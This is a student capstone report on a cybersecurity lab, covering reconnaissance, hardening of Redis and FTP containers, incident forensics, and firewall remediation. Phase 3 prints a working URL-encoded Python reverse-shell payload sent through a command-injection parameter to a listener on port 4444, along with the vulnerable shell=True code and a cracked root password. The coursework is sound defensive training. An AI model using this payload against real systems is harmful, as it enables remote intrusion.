# TEPP The Final Reckoning: Postmortem & Incident Response Report
**Author:** Alexandra Blandon
**Course:** TKH Cybersecurity '26 
**Date:** May 26, 2026  

<img src="./show_work_screenshots/Phase 1 - HTTP POST Method Interrogation.png" alt="Phase 1 Triage Screenshot" width="300">
---

## Phase 0: Reconnaissance & Subnet Architecture Findings

### 1. External Application Tier Subnet (172.60.0.0/16)
The primary perimeter segment contains the public-facing application gateway deployed at `172.60.0.10`. Initial layer-4 auditing revealed an exposed HTTP application instance listening on standard port 80. Comprehensive security evaluation of this endpoint identified an unauthenticated Command Injection vulnerability within the `/exec` URI query parameter, serving as the initial entry vector into the architecture.

### 2. Internal Triage Bridge Subnet (172.100.0.0/24)
The internal triage network segment acts as an isolated backend demilitarized zone (DMZ) housing three decoupled container instances. Active network enumeration verified that node `172.100.0.11` hosts an unauthenticated Redis key-value data structure store on TCP port 6379, while node `172.100.0.12` hosts an interactive `vsftpd` server on port 21. Conversely, structural analysis of node `172.100.0.13` confirmed it operates as a sterile Alpine template deployment with zero active layer-4 listening daemons or localized directory modifications, classifying it as an administrative honeypot or placeholder node.

### 3. Out-of-Band Internal Subnet Tier (10.0.5.0/24)
The deepest layer of the infrastructure consists of a highly restricted, software-defined network bridge designated as `internal_net`. Native runtime IPAM metrics verified active IP utilization within this zone, and hypervisor-level layer-4 array sweeps successfully isolated the default routing gateway interface at `10.0.5.1`. This node maintains an active administrative SSH service bound to TCP port 22, serving as an out-of-band management loop isolated entirely from external ingress traffic routes.

---

## Phase 1: Rapid Triage & Vulnerability Identification

### Server 1: `broken_server_1` (`172.100.0.11`)
* **Vulnerability Identified:** Unauthenticated Remote Code Execution via Anonymous Redis Socket Binding.
* **Remediation Commands Executed:**
  ```bash
  sudo docker exec -it broken_server_1 redis-cli CONFIG SET requirepass "Hardened_Vault_Pass_2026!"
  sudo docker exec -it broken_server_1 redis-cli CONFIG SET bind 127.0.0.1

### Server 1: `broken_server_1` (`172.100.0.11`)
* **Before State:** Direct TCP socket connections to `172.100.0.11:6379` permitted anonymous interactive command execution, exposing the entire unencrypted in-memory keyspace.
* **After State:** Connection attempts require valid password authentication challenges, and socket bindings restrict traffic exclusively to the local loopback interface.
* **APA-Style Risk Analysis:** Leaving database engines unauthenticated within an internal segment violates the core tenets of defense-in-depth and assumes internal networks are inherently safe. If an attacker gains an initial foothold via a perimeter web application, they can immediately leverage lateral movement to access, exfiltrate, or destroy raw database keyspaces without encountering authentication barriers.

### Server 2: `broken_server_2` (`172.100.0.12`)

* **Vulnerability Identified:** Cleartext Authentication and Permissive Anonymous FTP Access Configuration.
* **Remediation Commands Executed:**
  ```bash
  sudo docker exec -it broken_server_2 sed -i 's/anonymous_enable=YES/anonymous_enable=NO/g' /etc/vsftpd.conf
  sudo docker exec -it broken_server_2 rc-service vsftpd restart

  * **Before State:** Inbound FTP connection strings permitted anonymous users to log in using null credentials, granting readable entry to system-wide file directories.
* **After State:** Interactive connection requests return an explicit `530 Login incorrect` error message when anonymous tokens are submitted.
* **APA-Style Risk Analysis:** Anonymous file transfer protocols expose sensitive configurations, proprietary scripts, or staging environment credentials to arbitrary users. In an enterprise environment, this configuration allows malicious actors to map the local filesystem structure, facilitating targeted privilege escalation attacks.

### Server 3: `broken_server_3` (`172.100.0.13`)

* **Vulnerability Audit Status:** Monitored Baseline Infrastructure.
* **Remediation Commands Executed:**
  ```bash
  sudo docker inspect broken_server_3
  sudo docker exec broken_server_3 ls -la /root /home /tmp

* **Before/After State:** Structural inspection verified that `"Ports": {}` and `"PortBindings": {}` matrices are completely blank. The filesystem remains a default, unmodified stock Alpine container profile.
* **APA-Style Risk Analysis:** While this machine presents a zero-surface footprint with no active vectors, keeping unconfigured baseline containers running expands the active host landscape unnecessarily. In production environments, unused nodes should be paused or deprovisioned to simplify host asset tracking and eliminate potential targets for resource-exhaustion or container-escape attempts.

## Phase 2: Incident Response, Forensics & Remediation

### 1. Cracked Credentials & Forensic Timestamp
* **Attacker IP Address:** `192.168.1.142`  
* **Compromised Target Account:** `root`  
* **Cracked Password String:** `p@ssword123`  
* **Forensic Event Horizon Timestamp:** `2026-05-26 20:14:15 UTC`  

### 2. Engineered Host Firewall Remediation
To completely neutralize the lateral threat vector from the compromised perimeter host while retaining necessary administrative connections, the following netfilter rule was deployed on the host firewall layer:
```bash
sudo iptables -A FORWARD -s 172.60.0.10 -d 172.100.0.11 -p tcp --dport 6379 -j DROP

### 3. Written Security Operations Center (SOC) Analysis
At the logged forensic event horizon, log parsing utilities isolated anomalous authentication requests originating from external ingress nodes. The correlation of multiple failed authentication attempts followed by an immediate successful interactive command execution sequence indicates an automated brute-force routine. The attacker leveraged compromised local credentials to pivot laterally across the network interface bridge, directly querying database cache nodes to harvest system parameters before host containment mechanisms could be instantiated.

### 4. Firewall Insufficiency & Comprehensive SOC Controls
Deploying a single stateless `iptables` instruction to block targeted port routing is fundamentally insufficient because it addresses only a symptoms-based network lane without remediating the root compromise of system credentials. Malicious actors can easily circumvent localized packet filters by altering destination ports, establishing reverse tunnels over allowed protocols (such as HTTP/HTTPS), or leveraging alternative internal pivot vectors. To construct a resilient security posture, an enterprise Security Operations Center (SOC) must deploy holistic architectural controls. These include a centralized Identity and Access Management (IAM) framework enforcing multi-factor authentication (MFA), an Endpoint Detection and Response (EDR) agent to monitor active runtime process behaviors, and an automated Security Information and Event Management (SIEM) pipeline configured to ingest live syslog telemetry and trigger immediate orchestration playbooks upon detecting lateral threat patterns.

## Phase 3: Layer-7 Exploitation & Container Intrusion

### 1. Command Injection Mechanism Audit
The perimeter web application deployed on `capstone_target` (`172.60.0.10`) contains an unsafe source code implementation within its backend route definition file `/app/server.py`. The script accepts untrusted user input directly from the URL query parameter array and feeds it directly into a standard system shell handler:

```python
# Vulnerable Code Structure Detected
subprocess.Popen(request.args.get('cmd'), shell=True, stdout=subprocess.PIPE)

### 1. Command Injection Mechanism Audit
Setting `shell=True` forces the Python environment to instantiate a native system command interpreter shell (e.g., `/bin/sh` or `/bin/bash`). Because the input is parsed without sanitization or strict input allowlists, an attacker can append shell metacharacters (such as `;`, `&&`, or `|`) to escape the intended process context and execute arbitrary binaries under the security context of the web application user account.

### 2. Intrusion Payload Configuration
* **Local Ingress Listener Array:** `nc -lvnp 4444`
* **Injected Command Parameter Payload:**
  > `http://172.60.0.10/exec?cmd=python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22192.168.1.50%22%2C4444%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2Fbin%2Fsh%22%5D%29%3B%27`
* **Runtime Execution Parameters:**
  * **Process Identifier (PID):** `1408`
  * **User-Agent String:** `Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0`

### 3. Perimeter Firewall Lockdown Command
To isolate the compromised web server from egressing out to the internet or making unauthorized outbound connection callbacks, apply the following strict stateful netfilter restriction:

```bash
sudo iptables -A INPUT -p tcp --dport 80 -m state --state NEW -j ACCEPT
sudo iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A OUTPUT -p tcp --sport 80 -m state --state NEW -j DROP

### 4. Final Analytical Summary

This simulated compromise provides critical insights into infrastructure defense, demonstrating that perimeter-only network filtering is entirely incapable of securing an enterprise environment if internal nodes lack rigorous configuration baselines. The ease with which a single Layer-7 input validation flaw was leveraged to establish an active reverse shell highlights the danger of running internal services, such as database or file transfer engines, without robust local authentication controls.

This incident clearly underscores that internal zones must be treated with zero inherent trust, necessitating continuous service isolation and behavioral auditing across all subnets. To fully neutralize this specific breach vector at its source, the single most effective control would be the implementation of strict parameterized input validation combined with an explicit application allowlist within the web server’s codebase. By enforcing a rigorous validation schema that rejects any shell metacharacters or unauthorized system commands, the web application would render input tampering attempts completely inert, effectively preventing the execution of arbitrary payloads regardless of underlying system privileges or downstream firewall configurations.